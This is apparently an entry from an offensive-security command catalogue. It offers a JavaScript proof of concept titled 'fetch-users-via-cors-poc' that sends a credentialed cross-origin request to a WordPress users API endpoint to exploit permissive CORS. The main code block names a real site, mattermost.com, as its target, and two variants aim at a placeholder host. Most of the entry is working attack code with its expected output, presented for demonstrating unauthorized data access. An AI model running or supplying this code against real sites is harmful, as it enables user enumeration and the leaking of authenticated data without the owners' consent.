---
data: >-
  var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){
  if(this.readyState == 4 && this.status == 200){
  document.getElementById("demo").innerHTML = this.responseText;
  alert(this.responseText); } }; xhr.open("GET",
  "https://mattermost.com/wp-json/wp/v2/users/", true); xhr.withCredentials =
  true; xhr.send();
tags:
  - cors
  - poc
  - information-disclosure
type: command
executor: javascript
platforms:
  - Web
id: ea173949-1b99-4270-9f48-45d5251e7991
created_at: '2025-12-14T17:28:44.960Z'
updated_at: '2025-12-14T17:28:44.960Z'
verified: false
validated: true
submitted: true
---
# fetch-users-via-cors-poc

## Command

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
  if(this.readyState == 4 && this.status == 200){
    document.getElementById("demo").innerHTML = this.responseText;
    alert(this.responseText);
  }
};
xhr.open("GET", "https://mattermost.com/wp-json/wp/v2/users/", true);
xhr.withCredentials = true;
xhr.send();
```

## Description

This JavaScript command performs a cross-origin GET request using XMLHttpRequest to fetch user data from a WordPress REST API endpoint, exploiting permissive CORS to display the JSON response in an alert. Use it in an HTML PoC to demonstrate unauthorized data access from any origin.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Target API endpoint (e.g., https://mattermost.com/wp-json/wp/v2/users/) | Yes |
| withCredentials | Enables credential inclusion for CORS (set to true) | Yes |
| onreadystatechange | Callback to handle response and alert data | Yes |

## Examples

### Basic Usage

Embed in HTML and load from a different origin:

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
  if(this.readyState == 4 && this.status == 200){
    alert(this.responseText);
  }
};
xhr.open("GET", "https://target.com/wp-json/wp/v2/users/", true);
xhr.withCredentials = true;
xhr.send();
```

### Advanced Usage

Modify to log instead of alert:

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
  if(this.readyState == 4 && this.status == 200){
    console.log(JSON.parse(this.responseText));
  }
};
xhr.open("GET", "https://target.com/wp-json/wp/v2/users/", true);
xhr.withCredentials = true;
xhr.send();
```

## Expected Output

An alert box or console log displaying JSON array of user objects, e.g., [{"id":1,"name":"Admin","slug":"admin",...}], confirming successful cross-origin fetch without errors.

## Related

- [[Related Procedure]]
